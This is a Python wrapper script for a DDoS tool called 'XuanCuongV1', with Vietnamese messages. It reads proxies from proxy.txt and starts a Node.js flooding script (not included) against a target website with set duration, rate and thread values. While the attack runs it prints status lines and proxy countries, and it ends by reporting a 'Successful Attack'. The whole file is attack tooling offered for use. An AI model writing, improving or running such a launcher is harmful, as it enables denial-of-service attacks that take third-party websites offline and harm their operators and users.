try:
 import argparse
 import subprocess
 import time
 import requests
 import sys
 from colorama import Fore, Style
 import random
 from datetime import datetime
 import threading
 import os
 import re
 import importlib
 import pip
 
except:


	print (luc + "Bạn Chưa Tải Thư Viện \n Bắt Đầu Tải ")


	os.system('pip install requests && pip install colorama && pip install subprocess')

def remove_port__(proxy):
    proxy_parts = proxy.split(':')
    if len(proxy_parts) == 2:
        return proxy_parts[0]
    return proxy

def country_target____(proxyhttp):
    url = f"http://ip-api.com/json/{proxyhttp}"
    response = requests.get(url)
    data = response.json()
    return data.get("country", "Không xác định")

def create_proxy_file_if_not_exists():
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w") as proxy_file:
            print(f"{Fore.YELLOW}\nĐã phát hiện chưa có file proxy.txt và tiến hành tạo thành công !{Style.RESET_ALL}")
            sys.exit()
    elif os.path.exists("proxy.txt") and os.path.getsize("proxy.txt") == 0:
        print(f"{Fore.RED}\nLỗi: Vui lòng thêm proxy vào file proxy.txt để sử dụng ddos tool!{Style.RESET_ALL}")
        sys.exit()
    else:
        with open("proxy.txt", "r") as proxy_file:
            for line in proxy_file:
                proxy = line.strip()
                if not re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
                    print(f"{Fore.RED}\nLỗi: Proxy phải là http/https, vui lòng nhập đúng định dạng ip proxy ví dụ: 103.167.22.58:80{Style.RESET_ALL}")
                    sys.exit()
def run_ddos(args, process):
    start_time = time.time()
    custom_colors = None

    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time
        if elapsed_time >= args.time:
            process.terminate()
            break
        with open("proxy.txt", "r") as proxy_file:
            for line in proxy_file:
                proxy = line.strip()
                proxy_ip = remove_port__(proxy)
                ____country_target = country_target____(proxy_ip)
                current_color = Fore.WHITE
                if not custom_colors:
                    custom_colors = [color for color in Fore.__dict__.values() if isinstance(color, str) and color != Fore.RESET]
                    custom_colors.remove(Fore.BLACK)
                    custom_colors.remove(Fore.WHITE)
                    custom_colors.remove(Fore.LIGHTBLACK_EX)
                current_color = random.choice(custom_colors)
                custom_colors.remove(current_color)
                current_time = datetime.now().strftime("%H:%M:%S")
                print(f"{current_color}🚀XuanCuongV1🚀 - Target: {args.website}:443 || IP: {____country_target} || Status: Sending Request To Server {Style.RESET_ALL}")
                elapsed_time = time.time() - start_time
                if elapsed_time >= args.time:
                    process.terminate()
                    break
    print(f"{Fore.GREEN}\nSuccessful Attack URL {args.website} - Time {args.time}s !?{Style.RESET_ALL}")
    input(f"{Fore.YELLOW}Nhấn Enter Để Thoát Tool.{Style.RESET_ALL}")
    exit()

def main(args):
    node_command = ["node", "xuancuongv1.js", args.website, str(args.time), str(args.rate), str(args.thread), "proxy.txt"]
    try:
        create_proxy_file_if_not_exists()
        process = subprocess.Popen(node_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        ddos_thread = threading.Thread(target=run_ddos, args=(args, process))
        ddos_thread.start()
        ddos_thread.join()

    except Exception as e:
        print("LỖI:",e)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS tool")
    parser.add_argument("website", help="Target website URL")
    parser.add_argument("time", type=int, help="Time")
    parser.add_argument("rate", type=int, help="Rate")
    parser.add_argument("thread", type=int, help="Thread")
    args = parser.parse_args()
    main(args)
    